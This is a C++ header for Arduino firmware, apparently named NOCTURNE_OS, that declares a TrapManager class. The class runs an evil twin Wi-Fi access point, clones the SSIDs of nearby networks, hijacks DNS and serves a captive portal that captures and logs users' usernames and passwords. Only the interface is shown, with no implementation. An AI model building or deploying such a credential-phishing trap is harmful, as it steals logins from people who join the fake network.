/*
 * NOCTURNE_OS — TrapManager: Evil Twin AP + Captive Portal.
 * Open WiFi "FREE_WIFI_CONNECT", DNS hijack to 192.168.4.1, dark portal
 * captures username/password for display and logging.
 */
#ifndef NOCTURNE_TRAP_MANAGER_H
#define NOCTURNE_TRAP_MANAGER_H

#include <Arduino.h>

#define TRAP_LAST_PASSWORD_LEN 32
#define TRAP_LAST_PASSWORD_DISPLAY_MS 5000

class TrapManager {
public:
  TrapManager();
  void start();
  void stop();
  void tick();

  bool isActive() const { return active_; }
  /** True if start() was called but WiFi.softAP() failed. */
  bool isApFailed() const { return apFailed_; }
  int getClientCount() const;
  int getLogsCaptured() const { return logsCaptured_; }
  const char *getLastPassword() const { return lastPassword_; }
  unsigned long getLastPasswordShowUntil() const {
    return lastPasswordShowUntil_;
  }
  /** Set SSID to clone from scan (index). If -1, use default.
   * If the scanned network has encryption, AP will use TRAP_AP_PASSWORD. */
  void setClonedSSID(int scanIndex);
  /** Set clone from SSID string (call before WiFi.scanDelete when switching RADAR->TRAP). */
  void setClonedSSIDFromStrings(const char *ssid, bool usePassword);
  const char *getClonedSSID() const { return clonedSSID_; }
  /** AP password when cloning encrypted network (for display). nullptr if open. */
  const char *getCloneApPassword() const {
    return useApPassword_ && cloneApPasswordDisplay_[0] != '\0'
               ? cloneApPasswordDisplay_
               : nullptr;
  }

private:
  void setupHandlers();
  void servePortal();
  void handlePost();

  bool active_ = false;
  bool apFailed_ = false;
  int logsCaptured_ = 0;
  char lastPassword_[TRAP_LAST_PASSWORD_LEN];
  unsigned long lastPasswordShowUntil_ = 0;
  char clonedSSID_[33];
  char cloneApPasswordDisplay_[32];  // copy for getCloneApPassword()
  bool useClonedSSID_ = false;
  bool useApPassword_ = false;  // true when cloned network had encryption
};

#endif
